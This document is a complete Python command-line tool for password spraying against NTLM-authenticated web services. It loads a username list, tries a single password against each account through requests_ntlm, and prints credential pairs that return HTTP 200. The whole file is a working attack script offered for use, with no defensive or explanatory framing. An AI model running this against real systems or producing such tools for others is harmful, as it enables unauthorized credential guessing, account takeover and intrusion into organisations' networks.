#!/usr/bin/python3

import requests
from requests_ntlm import HttpNtlmAuth
import sys, getopt


# create class
class NTLMSpray:
    # idintify variable
    def __init__(self, fqdn):
        self.fqdn = fqdn
        self.verbose = True
        self.auth_success = 200
        self.auth_fail = 401


    def load_file(self, userfile):
        self.users = []
        lines = open(userfile, 'r').readlines()
        for line in lines:
            self.users.append(line.replace("\r", "").replace("\n", ""))


    def start_spray(self, password, url):
        print("i started spray attack " + password)
        count = 0
        for user in self.users:
            response = requests.get(url, auth=HttpNtlmAuth(self.fqdn + "\\" + user, password))
            if response.status_code == self.auth_success:
                print(f"[+] valid username {user} and password {password}")
                count += 1
                continue
            if (self.verbose):
                if response.status_code == self.auth_fail:
                    print(f"[-] invalid")
        print(f" count: {count}")


# argument in terminal
def main(argv):
    userfile = ""
    fqdn = ""
    password = ""
    url = ""
    try:
        # short option
        opts, args = getopt.getopt(argv, "hu:d:p:U:", ["userfile=", "fqdn=", "password=", "url="])
    except getopt.GetoptError:
        print("Error argument is not valid use help: -h")
        sys.exit(2)

    for opt, arg in opts:
        if opt == "-h":
            print("Ntlm_passwdspray.py -u <userfile> -d <fqdn> -p <password> -U <url>")
            sys.exit()
        elif opt in ("-u", "--userfile"):
            userfile = str(arg)
        elif opt in ("-d", "--fqdn"):
            fqdn = str(arg)
        elif opt in ("-p", "--password"):
            password = str(arg)
        elif opt in ("-U", "--url"):
            url = str(arg)

    if (len(userfile) > 0 and len(password) > 0 and len(fqdn) > 0 and len(url) > 0):
        spray = NTLMSpray(fqdn)
        spray.load_file(userfile)
        spray.start_spray(password, url)
        exit(0)
    else:
        print("[-] Invalid argument")
        exit(2)


if __name__ == "__main__":
    main(sys.argv[1:])